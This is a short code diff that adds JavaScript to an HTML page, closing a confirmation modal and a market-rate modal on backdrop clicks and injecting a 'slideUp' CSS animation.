+    document.getElementById('confirmationModal').addEventListener('click', (e) => {
+      if (e.target.id === 'confirmationModal') closeConfirmationModal();
+    });
+
+    document.getElementById('marketRateModal').addEventListener('click', (e) => {
+      if (e.target.id === 'marketRateModal') closeMarketRateModal();
+    });
+
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes slideUp {
+        to {
+          transform: translateY(-120px);
+          opacity: 0;
+        }
+      }
+    `;
+    document.head.appendChild(style);
   </script>
+
 </body>
 </html>
